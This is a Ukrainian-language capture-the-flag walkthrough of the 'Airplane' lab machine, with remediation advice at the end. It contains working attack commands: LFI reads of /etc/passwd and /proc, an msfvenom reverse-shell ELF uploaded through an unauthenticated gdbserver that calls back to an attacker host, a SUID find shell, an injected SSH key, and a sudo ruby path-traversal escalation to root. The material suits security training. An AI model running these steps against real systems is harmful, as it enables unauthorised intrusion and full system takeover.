
# Airplane - Are you ready to fly?

Складність: Medium

Ціль: 10.114.164.127

## 1. Розвідка (Reconnaissance & Enumeration)

### 1.1. Сканування портів (Nmap):
   Проведено повне сканування TCP-портів із визначенням версій сервісів та запуском стандартних NSE-скриптів.
```bash
└─$ sudo nmap -sC -sV -p- -vv -oN nmap_result.txt 10.114.164.127
```

![nmap](./img/nmap.png)

   У результаті було виявлено три відкриті порти:
   * `22`   - OpenSSH
   * `6048` - невідомий сервіс
   * `8000` - Werkzeug (Python Flask)

   Під час аналізу відповіді вебсервер повідомив: `Did not follow redirect to http://airplane.thm:8000/?page=index.html`. Отже, для коректної роботи застосунку необхідно додати запис `10.114.164.127 airplane.thm` до файлу `/etc/hosts`.
   
### 1.2. Веб-розвідка:
   Після відкриття сторінки відразу привертає увагу параметр `?page=index.html`. Подібний спосіб завантаження сторінок дуже часто вказує на можливість Local File Inclusion (LFI).
   Перевіряю це:
```bash
└─$ curl http://airplane.thm:8000/?page=../../../../etc/passwd
```

![curl_etc_passwd](./img/curl_etc_passwd.png)

   Вразливість підтвердилася — сервер повернув вміст `/etc/passwd`.
   Також ми вже знаємо двох реальних користувачів:
   * `carlos`
   * `hudson`
     
   Наступним кроком було отримання вихідного коду вебзастосунку.
```bash
└─$ curl http://airplane.thm:8000/?page=../app.py
from flask import Flask, send_file, redirect, render_template, request
import os.path

app = Flask(__name__)

@app.route('/')
def index():
    if 'page' in request.args:
        page = 'static/' + request.args.get('page')

        if os.path.isfile(page):
            resp = send_file(page)
            resp.direct_passthrough = False

            if os.path.getsize(page) == 0:
                resp.headers["Content-Length"]=str(len(resp.get_data()))

            return resp
        
        else:
            return "Page not found"

    else:
        return redirect('http://airplane.thm:8000/?page=index.html', code=302)    

@app.route('/airplane')
def airplane():
    return render_template('airplane.html')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000)
```

   Отриманий код Flask-додатку показав, що значення параметра `page` без належної валідації використовується для формування шляху до файлу, який потім передається у `send_file()`. Це дозволяє виконати directory traversal та прочитати довільні файли файлової системи (LFI).

   Далі були прочитані службові файли процесу.
```bash
└─$ curl "http://airplane.thm:8000/?page=./../../../../proc/self/environ" -o environ
...
└─$ cat environ                                                                     
LANG=en_US.UTF-8LC_ADDRESS=tr_TR.UTF-8LC_IDENTIFICATION=tr_TR.UTF-8LC_MEASUREMENT=tr_TR.UTF-8LC_MONETARY=tr_TR.UTF-8LC_NAME=tr_TR.UTF-8LC_NUMERIC=tr_TR.UTF-8LC_PAPER=tr_TR.UTF-8LC_TELEPHONE=tr_TR.UTF-8LC_TIME=tr_TR.UTF-8PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
HOME=/home/hudsonLOGNAME=hudsonUSER=hudsonSHELL=/bin/bashINVOCATION_ID=c3c53c2ed9924801948fece46386b7c9JOURNAL_STREAM=9:19088
└─$ curl "http://airplane.thm:8000/?page=..//../../../proc/self/cmdline" -o cmdline
...
└─$ cat cmdline                                                                    
/usr/bin/python3app.py 
```

  З environ ми отримали:`HOME=/home/hudson` та `USER=hudson`. Отже, Flask-додаток працює від користувача `hudson`, а не від звичного `www-data`. Це важливо, оскільки будь-яке виконання коду через вебзастосунок відразу надасть права користувача `hudson`.

   Наступною задачею стало визначення сервісу, що слухає порт `6048`.
   Для цього було автоматизовано перегляд `/proc/<PID>/cmdline`.
```bash
#!/bin/bash
for i in $(seq 1 1000); do
    out=$(curl -s "http://airplane.thm:8000/?page=../../../../proc/$i/cmdline")
    if [[ "$out" != "Page not found" && -n "$out" ]]; then
        echo "$i: $out"
    fi
done
```

   Результат:
```bash
└─$ ./ids.sh
...
529: /usr/bin/gdbserver0.0.0.0:6048airplane
...
```

![529.png](./img/529.png)

   Було встановлено, що на порту `6048` працює `gdbserver` без автентифікації. Подібна конфігурація дозволяє підключитися до віддаленого відлагоджувача, передати на цільову машину власний ELF-файл за допомогою команди `remote put` та виконати його.
   ```bash
└─$ gdb
...
(gdb) target extended-remote airplane.thm:6048
...
(gdb) help remote
```

![gdb](./img/dbg.png)

## 2. Точка входу (Initial Access / Foothold)

### 2.1. Експлуатація вразливості
   Для експлуатації відкритого `gdbserver` було використано методику, описану в [HackTricks](https://hacktricks.wiki/en/network-services-pentesting/pentesting-remote-gdbserver.html#upload-and-execute).
```bash
└─$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.130.250 LPORT=4444 PrependFork=true -f elf -o binary.elf
└─$ chmod +x binary.elf
└─$ gdb binary.elf 
# Set remote debuger target
(gdb) target extended-remote airplane.thm:6048
# Upload elf file
(gdb) remote put binary.elf /home/hudson/binary.elf
# Set remote executable file
(gdb) set remote exec-file /home/hudson/binary.elf
# Execute reverse shell executable
run
# You should get your reverse-shell
```

### 2.2. Отримання реверс-шеллу
   Попередньо запускається слухач. 
```bash
└─$ nc -lvnp 4444
```

   Після виконання ELF-файлу через `gdbserver` було отримано реверс-шел від користувача `hudson`. Перевірка підтвердила успішний початковий доступ.   

![nc_4444.png](./img/nc_4444.png)

## 3. Підвищення привілеїв (Privilege Escalation)

### 3.1. Горизонтальне переміщення (`hudson` → `carlos`)
   Пошук SUID-файлів показав нестандартний результат.
```bash
hudson@airplane:/home/hudson$ find / -perm -4000 -type f 2>/dev/null
```
   Було виявлено, що `/usr/bin/find` має встановлений SUID-біт і власником файлу є користувач `carlos`.  

![find](./img/find.png)

   Згідно з [GTFOBins](https://gtfobins.org/gtfobins/find/), `find` дозволяє отримати shell зі збереженням ефективного UID.
```bash
hudson@airplane:/home/hudson$ /usr/bin/find . -exec /bin/sh -p \; -quit
```

   Після виконання:

![carlos_euid](./img/carlos_euid.png)

   Завдяки цьому вдалося прочитати файл `user.txt`.

![user_txt.png](./img/user_txt.png)

   Після цього для більш стабільного доступу був створений SSH-ключ та доданий до `/home/carlos/.ssh/authorized_keys`.

![ssh-keygen.png](./img/ssh-keygen.png)

```bash
bash-5.0$ echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC/DALXthm6wxIpapL/LyJK49UItNPVF+7+2a1bf24oYCg1YFNPEM314+J/oXQVpEgxK35mpTXde/UjpJMLHHU/7FvBcM00zAOCuG55nQX9nGOUT577BDxLAM2uPBrVP+pgZ4m4dxgSqy8QSqso3FZ2vrEYVieqp9HzNqNc2THx10WUzEEnIRVFBOxVMna9+58sPgQRaom25CSY6eu0mMkY9SG7XydLxi+sb6HlCx/j75Oml4qztxghQfSRWhghj8NDnJ8F7/Q3IUjKLPj7TC09H0FhxxFx6lfzbdbu+lOiEbRaOJkGQF8cjEyHsW1KrF5OuA/CoosGz0imrQj5+h04nIWTeczTGnUAdPrB+TadVAPL7wE5/JjuekP+BWkhoDFhiagZZ17h3rBiy78OU7bp3z6XSse5VcShkMHOPlC5t15HMnF38UhvMxN8o6eROqiwIqop+j22Sm4r8TNY/rKCpFKnxd8F4nPQSnzCXC91H51hIQIpfjjSa3aPUso62Yk= lester_1@Android' > /home/carlos/.ssh/authorized_keys
```

   Це дало можливість підключитись по SSH як користувач `carlos`.
```bash
└─$ ssh -i carlos carlos@10.114.164.127
```

### 3.2. Вертикальне підвищення (`carlos` → `root`)
   Після входу під carlos було виконано `sudo -l`. Отримано такий результат:   

![carlos_sudo-l.png](./img/carlos_sudo-l.png)

   Через використання wildcard (`*`) у правилі `sudo` стало можливим обійти обмеження за допомогою відносного шляху (`/root/../home/carlos/root.rb`), що дозволило виконати власний Ruby-скрипт від імені `root`.
```bash
carlos@airplane:~$ echo 'system("/bin/bash")' > root.rb
carlos@airplane:~$ sudo /usr/bin/ruby /root/../home/carlos/root.rb
```

   У результаті було отримано оболонку користувача `root` та доступ до файлу `root.txt`.

![root_txt.png](./img/root_txt.png)

## Висновки

   Під час проходження машини було використано ланцюжок із декількох вразливостей, кожна з яких окремо не обов'язково призводила б до повного компрометування системи, однак їх комбінація дозволила отримати права `root`.
   Початковий доступ був отриманий через Local File Inclusion (LFI) у веб-застосунку `Flask`. За допомогою LFI вдалося переглянути системні файли, визначити користувача, від імені якого працював застосунок, та дослідити процеси через файлову систему `/proc`. Це дозволило виявити відкритий `gdbserver`, який не вимагав автентифікації.
   Після підключення до `gdbserver` було завантажено власний ELF-файл із реверс-шеллом та виконано його на віддаленій машині, що забезпечило доступ від імені користувача `hudson`.
   Подальше підвищення привілеїв здійснювалося у два етапи:
* використання SUID-бінарника `find`, власником якого був `carlos`, що дозволило отримати shell з ефективним UID цього користувача;
* експлуатація некоректно налаштованого правила `sudo`, яке дозволяло запускати Ruby-скрипти від імені `root` із використанням wildcard у шляху, що дало змогу виконати власний Ruby-скрипт і отримати права суперкористувача.

   Таким чином було успішно пройдено весь ланцюжок компрометації: **LFI** → **gdbserver** → **hudson** → **SUID find** → **carlos** → **sudo Ruby** → **root**.

## Рекомендації

   Для усунення подібних вразливостей рекомендується:
* **Усунути LFI.** Не використовувати введені користувачем шляхи до файлів без перевірки. Замість цього застосовувати whitelist дозволених сторінок або жорстко визначені маршрути Flask.
* **Обмежити доступ до файлової системи `/proc`.** Хоча `/proc` необхідний для роботи Linux, вебзастосунок не повинен мати можливість довільно читати його через LFI, оскільки це дозволяє отримувати інформацію про запущені процеси, змінні середовища та параметри запуску.
* **Не запускати веб-застосунок від імені звичайного користувача.** Flask має працювати під окремим службовим обліковим записом із мінімальними привілеями.
* **Не залишати відкритий `gdbserver` у production-середовищі.** Якщо віддалене налагодження необхідне, воно повинно бути доступним лише локально або через захищений тунель із автентифікацією.
* **Регулярно перевіряти SUID-бінарники.** Видавати SUID лише тим програмам, для яких це дійсно необхідно. Нестандартні SUID-файли слід періодично переглядати.
* **Уникати використання wildcard у правилах `sudo`.** Дозволяти запуск лише конкретних файлів або команд із фіксованими шляхами.
* **Дотримуватися принципу найменших привілеїв (Least Privilege).** Кожен сервіс і користувач повинні мати лише ті права, які необхідні для виконання його функцій.


## Блок-схема
```
Nmap
   │
   ▼
Виявлення LFI (?page=)
   │
   ├── читання  /etc/passwd
   ├── читання  app.py
   └── аналіз /proc
        │
        ▼
Виявлення  gdbserver :6048
        │
        ▼
Reverse Shell (hudson)
        │
        ▼
    SUID find
        │
        ▼
 Shell як carlos
        │
        ▼
sudo ruby /root/*.rb
        │
        ▼
      root
```
